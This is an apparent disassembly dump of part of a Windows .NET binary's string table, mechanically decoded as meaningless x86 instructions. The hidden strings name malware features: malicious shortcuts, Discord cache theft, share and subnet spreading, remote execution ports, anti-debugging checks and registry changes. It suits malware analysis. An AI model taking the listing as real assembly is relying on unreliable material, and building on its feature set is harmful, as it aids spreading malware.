  4069cf:	6c                   	insb   (%dx),%es:(%edi)
  4069d0:	61                   	popa
  4069d1:	70 73                	jo     0x406a46
  4069d3:	65 64 4d             	gs fs dec %ebp
  4069d6:	69 6c 6c 69 73 65 63 	imul   $0x6f636573,0x69(%esp,%ebp,2),%ebp
  4069dd:	6f 
  4069de:	6e                   	outsb  %ds:(%esi),(%dx)
  4069df:	64 73 00             	fs jae 0x4069e2
  4069e2:	53                   	push   %ebx
  4069e3:	79 73                	jns    0x406a58
  4069e5:	74 65                	je     0x406a4c
  4069e7:	6d                   	insl   (%dx),%es:(%edi)
  4069e8:	2e 52                	cs push %edx
  4069ea:	75 6e                	jne    0x406a5a
  4069ec:	74 69                	je     0x406a57
  4069ee:	6d                   	insl   (%dx),%es:(%edi)
  4069ef:	65 2e 45             	gs cs inc %ebp
  4069f2:	78 63                	js     0x406a57
  4069f4:	65 70 74             	gs jo  0x406a6b
  4069f7:	69 6f 6e 53 65 72 76 	imul   $0x76726553,0x6e(%edi),%ebp
  4069fe:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  406a05:	73 74                	jae    0x406a7b
  406a07:	65 6d                	gs insl (%dx),%es:(%edi)
  406a09:	2e 52                	cs push %edx
  406a0b:	75 6e                	jne    0x406a7b
  406a0d:	74 69                	je     0x406a78
  406a0f:	6d                   	insl   (%dx),%es:(%edi)
  406a10:	65 2e 49             	gs cs dec %ecx
  406a13:	6e                   	outsb  %ds:(%esi),(%dx)
  406a14:	74 65                	je     0x406a7b
  406a16:	72 6f                	jb     0x406a87
  406a18:	70 53                	jo     0x406a6d
  406a1a:	65 72 76             	gs jb  0x406a93
  406a1d:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  406a24:	73 74                	jae    0x406a9a
  406a26:	65 6d                	gs insl (%dx),%es:(%edi)
  406a28:	2e 52                	cs push %edx
  406a2a:	75 6e                	jne    0x406a9a
  406a2c:	74 69                	je     0x406a97
  406a2e:	6d                   	insl   (%dx),%es:(%edi)
  406a2f:	65 2e 43             	gs cs inc %ebx
  406a32:	6f                   	outsl  %ds:(%esi),(%dx)
  406a33:	6d                   	insl   (%dx),%es:(%edi)
  406a34:	70 69                	jo     0x406a9f
  406a36:	6c                   	insb   (%dx),%es:(%edi)
  406a37:	65 72 53             	gs jb  0x406a8d
  406a3a:	65 72 76             	gs jb  0x406ab3
  406a3d:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  406a44:	62 75 67             	bound  %esi,0x67(%ebp)
  406a47:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  406a4e:	65 
  406a4f:	73 00                	jae    0x406a51
  406a51:	73 65                	jae    0x406ab8
  406a53:	74 5f                	je     0x406ab4
  406a55:	45                   	inc    %ebp
  406a56:	6e                   	outsb  %ds:(%esi),(%dx)
  406a57:	61                   	popa
  406a58:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  406a5c:	72 69                	jb     0x406ac7
  406a5e:	76 69                	jbe    0x406ac9
  406a60:	6c                   	insb   (%dx),%es:(%edi)
  406a61:	65 67 65 73 00       	gs addr16 gs jae 0x406a66
  406a66:	43                   	inc    %ebx
  406a67:	6c                   	insb   (%dx),%es:(%edi)
  406a68:	65 61                	gs popa
  406a6a:	6e                   	outsb  %ds:(%esi),(%dx)
  406a6b:	4f                   	dec    %edi
  406a6c:	6c                   	insb   (%dx),%es:(%edi)
  406a6d:	64 43                	fs inc %ebx
  406a6f:	6f                   	outsl  %ds:(%esi),(%dx)
  406a70:	70 69                	jo     0x406adb
  406a72:	65 73 00             	gs jae 0x406a75
  406a75:	67 65 74 5f          	addr16 gs je 0x406ad8
  406a79:	50                   	push   %eax
  406a7a:	72 6f                	jb     0x406aeb
  406a7c:	70 65                	jo     0x406ae3
  406a7e:	72 74                	jb     0x406af4
  406a80:	69 65 73 00 47 65 74 	imul   $0x74654700,0x73(%ebp),%esp
  406a87:	46                   	inc    %esi
  406a88:	69 6c 65 73 00 44 65 	imul   $0x62654400,0x73(%ebp,%eiz,2),%ebp
  406a8f:	62 
  406a90:	75 67                	jne    0x406af9
  406a92:	67 65 72 50          	addr16 gs jb 0x406ae6
  406a96:	72 6f                	jb     0x406b07
  406a98:	63 65 73             	arpl   %esp,0x73(%ebp)
  406a9b:	73 4e                	jae    0x406aeb
  406a9d:	61                   	popa
  406a9e:	6d                   	insl   (%dx),%es:(%edi)
  406a9f:	65 73 00             	gs jae 0x406aa2
  406aa2:	43                   	inc    %ebx
  406aa3:	6f                   	outsl  %ds:(%esi),(%dx)
  406aa4:	6d                   	insl   (%dx),%es:(%edi)
  406aa5:	6d                   	insl   (%dx),%es:(%edi)
  406aa6:	6f                   	outsl  %ds:(%esi),(%dx)
  406aa7:	6e                   	outsb  %ds:(%esi),(%dx)
  406aa8:	53                   	push   %ebx
  406aa9:	68 61 72 65 73       	push   $0x73657261
  406aae:	00 47 65             	add    %al,0x65(%edi)
  406ab1:	74 50                	je     0x406b03
  406ab3:	72 6f                	jb     0x406b24
  406ab5:	63 65 73             	arpl   %esp,0x73(%ebp)
  406ab8:	73 65                	jae    0x406b1f
  406aba:	73 00                	jae    0x406abc
  406abc:	46                   	inc    %esi
  406abd:	69 6c 65 41 74 74 72 	imul   $0x69727474,0x41(%ebp,%eiz,2),%ebp
  406ac4:	69 
  406ac5:	62 75 74             	bound  %esi,0x74(%ebp)
  406ac8:	65 73 00             	gs jae 0x406acb
  406acb:	53                   	push   %ebx
  406acc:	65 74 41             	gs je  0x406b10
  406acf:	74 74                	je     0x406b45
  406ad1:	72 69                	jb     0x406b3c
  406ad3:	62 75 74             	bound  %esi,0x74(%ebp)
  406ad6:	65 73 00             	gs jae 0x406ad9
  406ad9:	47                   	inc    %edi
  406ada:	65 74 44             	gs je  0x406b21
  406add:	72 69                	jb     0x406b48
  406adf:	76 65                	jbe    0x406b46
  406ae1:	73 00                	jae    0x406ae3
  406ae3:	54                   	push   %esp
  406ae4:	61                   	popa
  406ae5:	72 67                	jb     0x406b4e
  406ae7:	65 74 50             	gs je  0x406b3a
  406aea:	61                   	popa
  406aeb:	74 68                	je     0x406b55
  406aed:	73 00                	jae    0x406aef
  406aef:	3c 3e                	cmp    $0x3e,%al
  406af1:	34 5f                	xor    $0x5f,%al
  406af3:	5f                   	pop    %edi
  406af4:	74 68                	je     0x406b5e
  406af6:	69 73 00 53 79 73 74 	imul   $0x74737953,0x0(%ebx),%esi
  406afd:	65 6d                	gs insl (%dx),%es:(%edi)
  406aff:	2e 54                	cs push %esp
  406b01:	68 72 65 61 64       	push   $0x64616572
  406b06:	69 6e 67 2e 54 61 73 	imul   $0x7361542e,0x67(%esi),%ebp
  406b0d:	6b 73 00 4d          	imul   $0x4d,0x0(%ebx),%esi
  406b11:	61                   	popa
  406b12:	78 43                	js     0x406b57
  406b14:	6f                   	outsl  %ds:(%esi),(%dx)
  406b15:	6e                   	outsb  %ds:(%esi),(%dx)
  406b16:	63 75 72             	arpl   %esi,0x72(%ebp)
  406b19:	72 65                	jb     0x406b80
  406b1b:	6e                   	outsb  %ds:(%esi),(%dx)
  406b1c:	74 54                	je     0x406b72
  406b1e:	61                   	popa
  406b1f:	73 6b                	jae    0x406b8c
  406b21:	73 00                	jae    0x406b23
  406b23:	45                   	inc    %ebp
  406b24:	71 75                	jno    0x406b9b
  406b26:	61                   	popa
  406b27:	6c                   	insb   (%dx),%es:(%edi)
  406b28:	73 00                	jae    0x406b2a
  406b2a:	44                   	inc    %esp
  406b2b:	6e                   	outsb  %ds:(%esi),(%dx)
  406b2c:	73 00                	jae    0x406b2e
  406b2e:	43                   	inc    %ebx
  406b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  406b30:	6e                   	outsb  %ds:(%esi),(%dx)
  406b31:	74 61                	je     0x406b94
  406b33:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  406b3a:	74 65                	je     0x406ba1
  406b3c:	6d                   	insl   (%dx),%es:(%edi)
  406b3d:	2e 53                	cs push %ebx
  406b3f:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  406b43:	69 74 79 2e 50 65 72 	imul   $0x6d726550,0x2e(%ecx,%edi,2),%esi
  406b4a:	6d 
  406b4b:	69 73 73 69 6f 6e 73 	imul   $0x736e6f69,0x73(%ebx),%esi
  406b52:	00 49 6e             	add    %cl,0x6e(%ecx)
  406b55:	76 6f                	jbe    0x406bc6
  406b57:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  406b5b:	74 68                	je     0x406bc5
  406b5d:	6f                   	outsl  %ds:(%esi),(%dx)
  406b5e:	64 4f                	fs dec %edi
  406b60:	70 74                	jo     0x406bd6
  406b62:	69 6f 6e 73 00 43 6f 	imul   $0x6f430073,0x6e(%edi),%ebp
  406b69:	6e                   	outsb  %ds:(%esi),(%dx)
  406b6a:	6e                   	outsb  %ds:(%esi),(%dx)
  406b6b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406b70:	6e                   	outsb  %ds:(%esi),(%dx)
  406b71:	4f                   	dec    %edi
  406b72:	70 74                	jo     0x406be8
  406b74:	69 6f 6e 73 00 4f 62 	imul   $0x624f0073,0x6e(%edi),%ebp
  406b7b:	6a 65                	push   $0x65
  406b7d:	63 74 47 65          	arpl   %esi,0x65(%edi,%eax,2)
  406b81:	74 4f                	je     0x406bd2
  406b83:	70 74                	jo     0x406bf9
  406b85:	69 6f 6e 73 00 4d 61 	imul   $0x614d0073,0x6e(%edi),%ebp
  406b8c:	6e                   	outsb  %ds:(%esi),(%dx)
  406b8d:	61                   	popa
  406b8e:	67 65 6d             	gs insl (%dx),%es:(%di)
  406b91:	65 6e                	outsb  %gs:(%esi),(%dx)
  406b93:	74 4f                	je     0x406be4
  406b95:	70 74                	jo     0x406c0b
  406b97:	69 6f 6e 73 00 67 65 	imul   $0x65670073,0x6e(%edi),%ebp
  406b9e:	74 5f                	je     0x406bff
  406ba0:	43                   	inc    %ebx
  406ba1:	68 61 72 73 00       	push   $0x737261
  406ba6:	44                   	inc    %esp
  406ba7:	69 73 63 6f 72 64 43 	imul   $0x4364726f,0x63(%ebx),%esi
  406bae:	61                   	popa
  406baf:	63 68 65             	arpl   %ebp,0x65(%eax)
  406bb2:	46                   	inc    %esi
  406bb3:	6f                   	outsl  %ds:(%esi),(%dx)
  406bb4:	6c                   	insb   (%dx),%es:(%edi)
  406bb5:	64 65 72 73          	fs gs jb 0x406c2c
  406bb9:	00 70 6f             	add    %dh,0x6f(%eax)
  406bbc:	73 73                	jae    0x406c31
  406bbe:	69 62 6c 65 46 6f 6c 	imul   $0x6c6f4665,0x6c(%edx),%esp
  406bc5:	64 65 72 73          	fs gs jb 0x406c3c
  406bc9:	00 74 61 72          	add    %dh,0x72(%ecx,%eiz,2)
  406bcd:	67 65 74 46          	addr16 gs je 0x406c17
  406bd1:	6f                   	outsl  %ds:(%esi),(%dx)
  406bd2:	6c                   	insb   (%dx),%es:(%edi)
  406bd3:	64 65 72 73          	fs gs jb 0x406c4a
  406bd7:	00 47 65             	add    %al,0x65(%edi)
  406bda:	74 4d                	je     0x406c29
  406bdc:	65 74 68             	gs je  0x406c47
  406bdf:	6f                   	outsl  %ds:(%esi),(%dx)
  406be0:	64 50                	fs push %eax
  406be2:	61                   	popa
  406be3:	72 61                	jb     0x406c46
  406be5:	6d                   	insl   (%dx),%es:(%edi)
  406be6:	65 74 65             	gs je  0x406c4e
  406be9:	72 73                	jb     0x406c5e
  406beb:	00 4d 61             	add    %cl,0x61(%ebp)
  406bee:	6e                   	outsb  %ds:(%esi),(%dx)
  406bef:	61                   	popa
  406bf0:	67 65 6d             	gs insl (%dx),%es:(%di)
  406bf3:	65 6e                	outsb  %gs:(%esi),(%dx)
  406bf5:	74 43                	je     0x406c3a
  406bf7:	6c                   	insb   (%dx),%es:(%edi)
  406bf8:	61                   	popa
  406bf9:	73 73                	jae    0x406c6e
  406bfb:	00 47 65             	add    %al,0x65(%edi)
  406bfe:	74 43                	je     0x406c43
  406c00:	75 72                	jne    0x406c74
  406c02:	72 65                	jb     0x406c69
  406c04:	6e                   	outsb  %ds:(%esi),(%dx)
  406c05:	74 50                	je     0x406c57
  406c07:	72 6f                	jb     0x406c78
  406c09:	63 65 73             	arpl   %esp,0x73(%ebp)
  406c0c:	73 00                	jae    0x406c0e
  406c0e:	49                   	dec    %ecx
  406c0f:	50                   	push   %eax
  406c10:	41                   	inc    %ecx
  406c11:	64 64 72 65          	fs fs jb 0x406c7a
  406c15:	73 73                	jae    0x406c8a
  406c17:	00 63 74             	add    %ah,0x74(%ebx)
  406c1a:	73 00                	jae    0x406c1c
  406c1c:	53                   	push   %ebx
  406c1d:	79 73                	jns    0x406c92
  406c1f:	74 65                	je     0x406c86
  406c21:	6d                   	insl   (%dx),%es:(%edi)
  406c22:	2e 4e                	cs dec %esi
  406c24:	65 74 2e             	gs je  0x406c55
  406c27:	53                   	push   %ebx
  406c28:	6f                   	outsl  %ds:(%esi),(%dx)
  406c29:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  406c2c:	74 73                	je     0x406ca1
  406c2e:	00 45 78             	add    %al,0x78(%ebp)
  406c31:	69 73 74 73 00 49 50 	imul   $0x50490073,0x74(%ebx),%esi
  406c38:	53                   	push   %ebx
  406c39:	74 61                	je     0x406c9c
  406c3b:	74 75                	je     0x406cb2
  406c3d:	73 00                	jae    0x406c3f
  406c3f:	67 65 74 5f          	addr16 gs je 0x406ca2
  406c43:	53                   	push   %ebx
  406c44:	74 61                	je     0x406ca7
  406c46:	74 75                	je     0x406cbd
  406c48:	73 00                	jae    0x406c4a
  406c4a:	43                   	inc    %ebx
  406c4b:	6f                   	outsl  %ds:(%esi),(%dx)
  406c4c:	6e                   	outsb  %ds:(%esi),(%dx)
  406c4d:	63 61 74             	arpl   %esp,0x74(%ecx)
  406c50:	00 46 6f             	add    %al,0x6f(%esi)
  406c53:	72 6d                	jb     0x406cc2
  406c55:	61                   	popa
  406c56:	74 00                	je     0x406c58
  406c58:	4d                   	dec    %ebp
  406c59:	61                   	popa
  406c5a:	6e                   	outsb  %ds:(%esi),(%dx)
  406c5b:	61                   	popa
  406c5c:	67 65 6d             	gs insl (%dx),%es:(%di)
  406c5f:	65 6e                	outsb  %gs:(%esi),(%dx)
  406c61:	74 42                	je     0x406ca5
  406c63:	61                   	popa
  406c64:	73 65                	jae    0x406ccb
  406c66:	4f                   	dec    %edi
  406c67:	62 6a 65             	bound  %ebp,0x65(%edx)
  406c6a:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  406c6e:	61                   	popa
  406c6f:	6e                   	outsb  %ds:(%esi),(%dx)
  406c70:	61                   	popa
  406c71:	67 65 6d             	gs insl (%dx),%es:(%di)
  406c74:	65 6e                	outsb  %gs:(%esi),(%dx)
  406c76:	74 4f                	je     0x406cc7
  406c78:	62 6a 65             	bound  %ebp,0x65(%edx)
  406c7b:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  406c7f:	6f                   	outsl  %ds:(%esi),(%dx)
  406c80:	6e                   	outsb  %ds:(%esi),(%dx)
  406c81:	6e                   	outsb  %ds:(%esi),(%dx)
  406c82:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  406c87:	65 74 00             	gs je  0x406c8a
  406c8a:	53                   	push   %ebx
  406c8b:	79 73                	jns    0x406d00
  406c8d:	74 65                	je     0x406cf4
  406c8f:	6d                   	insl   (%dx),%es:(%edi)
  406c90:	2e 4e                	cs dec %esi
  406c92:	65 74 00             	gs je  0x406c95
  406c95:	49                   	dec    %ecx
  406c96:	73 44                	jae    0x406cdc
  406c98:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  406c9c:	52                   	push   %edx
  406c9d:	65 67 69 73 74 72 79 	imul   $0x65537972,%gs:0x74(%bp,%di),%esi
  406ca4:	53 65 
  406ca6:	74 00                	je     0x406ca8
  406ca8:	47                   	inc    %edi
  406ca9:	65 74 4c             	gs je  0x406cf8
  406cac:	6f                   	outsl  %ds:(%esi),(%dx)
  406cad:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  406cb0:	53                   	push   %ebx
  406cb1:	75 62                	jne    0x406d15
  406cb3:	6e                   	outsb  %ds:(%esi),(%dx)
  406cb4:	65 74 00             	gs je  0x406cb7
  406cb7:	53                   	push   %ebx
  406cb8:	70 6c                	jo     0x406d26
  406cba:	69 74 00 57 61 69 74 	imul   $0x46746961,0x57(%eax,%eax,1),%esi
  406cc1:	46 
  406cc2:	6f                   	outsl  %ds:(%esi),(%dx)
  406cc3:	72 45                	jb     0x406d0a
  406cc5:	78 69                	js     0x406d30
  406cc7:	74 00                	je     0x406cc9
  406cc9:	47                   	inc    %edi
  406cca:	65 74 52             	gs je  0x406d1f
  406ccd:	65 73 75             	gs jae 0x406d45
  406cd0:	6c                   	insb   (%dx),%es:(%edi)
  406cd1:	74 00                	je     0x406cd3
  406cd3:	53                   	push   %ebx
  406cd4:	65 74 52             	gs je  0x406d29
  406cd7:	65 73 75             	gs jae 0x406d4f
  406cda:	6c                   	insb   (%dx),%es:(%edi)
  406cdb:	74 00                	je     0x406cdd
  406cdd:	41                   	inc    %ecx
  406cde:	63 63 65             	arpl   %esp,0x65(%ebx)
  406ce1:	70 74                	jo     0x406d57
  406ce3:	54                   	push   %esp
  406ce4:	63 70 43             	arpl   %esi,0x43(%eax)
  406ce7:	6c                   	insb   (%dx),%es:(%edi)
  406ce8:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  406cef:	73 74                	jae    0x406d65
  406cf1:	65 6d                	gs insl (%dx),%es:(%edi)
  406cf3:	2e 4d                	cs dec %ebp
  406cf5:	61                   	popa
  406cf6:	6e                   	outsb  %ds:(%esi),(%dx)
  406cf7:	61                   	popa
  406cf8:	67 65 6d             	gs insl (%dx),%es:(%di)
  406cfb:	65 6e                	outsb  %gs:(%esi),(%dx)
  406cfd:	74 00                	je     0x406cff
  406cff:	45                   	inc    %ebp
  406d00:	6e                   	outsb  %ds:(%esi),(%dx)
  406d01:	76 69                	jbe    0x406d6c
  406d03:	72 6f                	jb     0x406d74
  406d05:	6e                   	outsb  %ds:(%esi),(%dx)
  406d06:	6d                   	insl   (%dx),%es:(%edi)
  406d07:	65 6e                	outsb  %gs:(%esi),(%dx)
  406d09:	74 00                	je     0x406d0b
  406d0b:	67 65 74 5f          	addr16 gs je 0x406d6e
  406d0f:	43                   	inc    %ebx
  406d10:	75 72                	jne    0x406d84
  406d12:	72 65                	jb     0x406d79
  406d14:	6e                   	outsb  %ds:(%esi),(%dx)
  406d15:	74 00                	je     0x406d17
  406d17:	47                   	inc    %edi
  406d18:	65 74 43             	gs je  0x406d5e
  406d1b:	75 72                	jne    0x406d8f
  406d1d:	72 65                	jb     0x406d84
  406d1f:	6e                   	outsb  %ds:(%esi),(%dx)
  406d20:	74 00                	je     0x406d22
  406d22:	54                   	push   %esp
  406d23:	68 72 65 61 64       	push   $0x64616572
  406d28:	53                   	push   %ebx
  406d29:	74 61                	je     0x406d8c
  406d2b:	72 74                	jb     0x406da1
  406d2d:	00 52 65             	add    %dl,0x65(%edx)
  406d30:	6d                   	insl   (%dx),%es:(%edi)
  406d31:	6f                   	outsl  %ds:(%esi),(%dx)
  406d32:	74 65                	je     0x406d99
  406d34:	45                   	inc    %ebp
  406d35:	78 65                	js     0x406d9c
  406d37:	63 50 6f             	arpl   %edx,0x6f(%eax)
  406d3a:	72 74                	jb     0x406db0
  406d3c:	00 70 6f             	add    %dh,0x6f(%eax)
  406d3f:	72 74                	jb     0x406db5
  406d41:	00 67 65             	add    %ah,0x65(%edi)
  406d44:	74 5f                	je     0x406da5
  406d46:	41                   	inc    %ecx
  406d47:	64 64 72 65          	fs fs jb 0x406db0
  406d4b:	73 73                	jae    0x406dc0
  406d4d:	4c                   	dec    %esp
  406d4e:	69 73 74 00 68 6f 73 	imul   $0x736f6800,0x74(%ebx),%esi
  406d55:	74 00                	je     0x406d57
  406d57:	43                   	inc    %ebx
  406d58:	72 65                	jb     0x406dbf
  406d5a:	61                   	popa
  406d5b:	74 65                	je     0x406dc2
  406d5d:	53                   	push   %ebx
  406d5e:	68 6f 72 74 63       	push   $0x6374726f
  406d63:	75 74                	jne    0x406dd9
  406d65:	00 43 72             	add    %al,0x72(%ebx)
  406d68:	65 61                	gs popa
  406d6a:	74 65                	je     0x406dd1
  406d6c:	4d                   	dec    %ebp
  406d6d:	61                   	popa
  406d6e:	6c                   	insb   (%dx),%es:(%edi)
  406d6f:	69 63 69 6f 75 73 53 	imul   $0x5373756f,0x69(%ebx),%esp
  406d76:	68 6f 72 74 63       	push   $0x6374726f
  406d7b:	75 74                	jne    0x406df1
  406d7d:	00 73 65             	add    %dh,0x65(%ebx)
  406d80:	74 5f                	je     0x406de1
  406d82:	54                   	push   %esp
  406d83:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  406d8a:	74 69                	je     0x406df5
  406d8c:	6d                   	insl   (%dx),%es:(%edi)
  406d8d:	65 6f                	outsl  %gs:(%esi),(%dx)
  406d8f:	75 74                	jne    0x406e05
  406d91:	00 67 65             	add    %ah,0x65(%edi)
  406d94:	74 5f                	je     0x406df5
  406d96:	53                   	push   %ebx
  406d97:	74 61                	je     0x406dfa
  406d99:	6e                   	outsb  %ds:(%esi),(%dx)
  406d9a:	64 61                	fs popa
  406d9c:	72 64                	jb     0x406e02
  406d9e:	4f                   	dec    %edi
  406d9f:	75 74                	jne    0x406e15
  406da1:	70 75                	jo     0x406e18
  406da3:	74 00                	je     0x406da5
  406da5:	73 65                	jae    0x406e0c
  406da7:	74 5f                	je     0x406e08
  406da9:	52                   	push   %edx
  406daa:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  406db1:	53 74 
  406db3:	61                   	popa
  406db4:	6e                   	outsb  %ds:(%esi),(%dx)
  406db5:	64 61                	fs popa
  406db7:	72 64                	jb     0x406e1d
  406db9:	4f                   	dec    %edi
  406dba:	75 74                	jne    0x406e30
  406dbc:	70 75                	jo     0x406e33
  406dbe:	74 00                	je     0x406dc0
  406dc0:	4d                   	dec    %ebp
  406dc1:	6f                   	outsl  %ds:(%esi),(%dx)
  406dc2:	76 65                	jbe    0x406e29
  406dc4:	4e                   	dec    %esi
  406dc5:	65 78 74             	gs js  0x406e3c
  406dc8:	00 53 79             	add    %dl,0x79(%ebx)
  406dcb:	73 74                	jae    0x406e41
  406dcd:	65 6d                	gs insl (%dx),%es:(%edi)
  406dcf:	2e 54                	cs push %esp
  406dd1:	65 78 74             	gs js  0x406e48
  406dd4:	00 57 72             	add    %dl,0x72(%edi)
  406dd7:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  406dde:	65 
  406ddf:	78 74                	js     0x406e55
  406de1:	00 53 74             	add    %dl,0x74(%ebx)
  406de4:	61                   	popa
  406de5:	72 74                	jb     0x406e5b
  406de7:	4e                   	dec    %esi
  406de8:	65 77 00             	gs ja  0x406deb
  406deb:	67 65 74 5f          	addr16 gs je 0x406e4e
  406def:	55                   	push   %ebp
  406df0:	74 63                	je     0x406e55
  406df2:	4e                   	dec    %esi
  406df3:	6f                   	outsl  %ds:(%esi),(%dx)
  406df4:	77 00                	ja     0x406df6
  406df6:	73 65                	jae    0x406e5d
  406df8:	74 5f                	je     0x406e59
  406dfa:	43                   	inc    %ebx
  406dfb:	72 65                	jb     0x406e62
  406dfd:	61                   	popa
  406dfe:	74 65                	je     0x406e65
  406e00:	4e                   	dec    %esi
  406e01:	6f                   	outsl  %ds:(%esi),(%dx)
  406e02:	57                   	push   %edi
  406e03:	69 6e 64 6f 77 00 54 	imul   $0x5400776f,0x64(%esi),%ebp
  406e0a:	68 72 6f 77 00       	push   $0x776f72
  406e0f:	48                   	dec    %eax
  406e10:	61                   	popa
  406e11:	73 44                	jae    0x406e57
  406e13:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  406e17:	54                   	push   %esp
  406e18:	69 6d 69 6e 67 44 65 	imul   $0x6544676e,0x69(%ebp),%ebp
  406e1f:	6c                   	insb   (%dx),%es:(%edi)
  406e20:	61                   	popa
  406e21:	79 00                	jns    0x406e23
  406e23:	67 65 74 5f          	addr16 gs je 0x406e86
  406e27:	49                   	dec    %ecx
  406e28:	73 52                	jae    0x406e7c
  406e2a:	65 61                	gs popa
  406e2c:	64 79 00             	fs jns 0x406e2f
  406e2f:	4f                   	dec    %edi
  406e30:	70 65                	jo     0x406e97
  406e32:	6e                   	outsb  %ds:(%esi),(%dx)
  406e33:	53                   	push   %ebx
  406e34:	75 62                	jne    0x406e98
  406e36:	4b                   	dec    %ebx
  406e37:	65 79 00             	gs jns 0x406e3a
  406e3a:	52                   	push   %edx
  406e3b:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  406e42:	4b 65 
  406e44:	79 00                	jns    0x406e46
  406e46:	67 65 74 5f          	addr16 gs je 0x406ea9
  406e4a:	41                   	inc    %ecx
  406e4b:	64 64 72 65          	fs fs jb 0x406eb4
  406e4f:	73 73                	jae    0x406ec4
  406e51:	46                   	inc    %esi
  406e52:	61                   	popa
  406e53:	6d                   	insl   (%dx),%es:(%edi)
  406e54:	69 6c 79 00 50 69 6e 	imul   $0x676e6950,0x0(%ecx,%edi,2),%ebp
  406e5b:	67 
  406e5c:	52                   	push   %edx
  406e5d:	65 70 6c             	gs jo  0x406ecc
  406e60:	79 00                	jns    0x406e62
  406e62:	41                   	inc    %ecx
  406e63:	70 70                	jo     0x406ed5
  406e65:	6c                   	insb   (%dx),%es:(%edi)
  406e66:	79 00                	jns    0x406e68
  406e68:	57                   	push   %edi
  406e69:	68 65 6e 41 6e       	push   $0x6e416e65
  406e6e:	79 00                	jns    0x406e70
  406e70:	43                   	inc    %ebx
  406e71:	6f                   	outsl  %ds:(%esi),(%dx)
  406e72:	70 79                	jo     0x406eed
  406e74:	00 67 65             	add    %ah,0x65(%edi)
  406e77:	74 5f                	je     0x406ed8
  406e79:	52                   	push   %edx
  406e7a:	6f                   	outsl  %ds:(%esi),(%dx)
  406e7b:	6f                   	outsl  %ds:(%esi),(%dx)
  406e7c:	74 44                	je     0x406ec2
  406e7e:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  406e85:	79 00                	jns    0x406e87
  406e87:	49                   	dec    %ecx
  406e88:	50                   	push   %eax
  406e89:	48                   	dec    %eax
  406e8a:	6f                   	outsl  %ds:(%esi),(%dx)
  406e8b:	73 74                	jae    0x406f01
  406e8d:	45                   	inc    %ebp
  406e8e:	6e                   	outsb  %ds:(%esi),(%dx)
  406e8f:	74 72                	je     0x406f03
  406e91:	79 00                	jns    0x406e93
  406e93:	47                   	inc    %edi
  406e94:	65 74 48             	gs je  0x406edf
  406e97:	6f                   	outsl  %ds:(%esi),(%dx)
  406e98:	73 74                	jae    0x406f0e
  406e9a:	45                   	inc    %ebp
  406e9b:	6e                   	outsb  %ds:(%esi),(%dx)
  406e9c:	74 72                	je     0x406f10
  406e9e:	79 00                	jns    0x406ea0
  406ea0:	55                   	push   %ebp
  406ea1:	70 64                	jo     0x406f07
  406ea3:	61                   	popa
  406ea4:	74 65                	je     0x406f0b
  406ea6:	52                   	push   %edx
  406ea7:	65 67 69 73 74 72 79 	imul   $0x53007972,%gs:0x74(%bp,%di),%esi
  406eae:	00 53 
  406eb0:	79 73                	jns    0x406f25
  406eb2:	74 65                	je     0x406f19
  406eb4:	6d                   	insl   (%dx),%es:(%edi)
  406eb5:	2e 53                	cs push %ebx
  406eb7:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  406ebb:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  406ec2:	64 
  406ec3:	6f                   	outsl  %ds:(%esi),(%dx)
  406ec4:	77 73                	ja     0x406f39
  406ec6:	49                   	dec    %ecx
  406ec7:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  406eca:	74 69                	je     0x406f35
  406ecc:	74 79                	je     0x406f47
  406ece:	00 00                	add    %al,(%eax)
  406ed0:	00 45 53             	add    %al,0x53(%ebp)
  406ed3:	00 65 00             	add    %ah,0x0(%ebp)
  406ed6:	6c                   	insb   (%dx),%es:(%edi)
  406ed7:	00 65 00             	add    %ah,0x0(%ebp)
  406eda:	63 00                	arpl   %eax,(%eax)
  406edc:	74 00                	je     0x406ede
  406ede:	20 00                	and    %al,(%eax)
  406ee0:	2a 00                	sub    (%eax),%al
  406ee2:	20 00                	and    %al,(%eax)
  406ee4:	66 00 72 00          	data16 add %dh,0x0(%edx)
  406ee8:	6f                   	outsl  %ds:(%esi),(%dx)
  406ee9:	00 6d 00             	add    %ch,0x0(%ebp)
  406eec:	20 00                	and    %al,(%eax)
  406eee:	57                   	push   %edi
  406eef:	00 69 00             	add    %ch,0x0(%ecx)
  406ef2:	6e                   	outsb  %ds:(%esi),(%dx)
  406ef3:	00 33                	add    %dh,(%ebx)
  406ef5:	00 32                	add    %dh,(%edx)
  406ef7:	00 5f 00             	add    %bl,0x0(%edi)
  406efa:	43                   	inc    %ebx
  406efb:	00 6f 00             	add    %ch,0x0(%edi)
  406efe:	6d                   	insl   (%dx),%es:(%edi)
  406eff:	00 70 00             	add    %dh,0x0(%eax)
  406f02:	75 00                	jne    0x406f04
  406f04:	74 00                	je     0x406f06
  406f06:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406f0a:	53                   	push   %ebx
